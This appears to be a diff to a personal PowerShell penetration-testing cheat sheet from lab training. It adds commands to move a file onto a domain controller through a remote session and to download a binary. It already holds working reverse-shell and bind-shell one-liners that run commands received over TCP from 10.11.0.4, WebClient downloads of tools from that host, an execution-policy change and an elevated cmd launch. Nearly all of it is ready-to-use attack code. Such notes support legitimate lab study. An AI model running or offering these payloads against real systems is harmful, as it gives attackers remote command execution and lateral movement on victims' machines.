@@ -3,14 +3,22 @@
 Set-ExecutionPolicy Unrestricted
 Get-ExecutionPolicy
 
-//Download file
+#Creating new PowerShell session
+#Checking the IP with Invoke-Command
+$dcsesh = New-PSSession -Computer SANDBOXDC
+Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}
+
+#Transferring whoami Binary to Domain Controller
+Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
+
+#Download file
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
 
-//Reverse Shell onliner
+#Reverse Shell onliner
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 
-//Reverse Shell
+#Reverse Shell
 $client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
@@ -25,7 +33,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
 }
 $client.Close();
 
-//Bind Shell onliner
+#Bind Shell onliner
 powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
 
 
@@ -62,4 +70,7 @@ Start-MpScan -ScanPath 'C:\\Users\\User\\' -ScanType QuickScan
 
 #Using powershell to spawn a cmd.exe process with high integrity
 powershell.exe Start-Process cmd.exe -Verb runAs
+
+#Command used to download whoami.exe
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/whoami.exe', 'c:\Users\Public\whoami.exe')
 
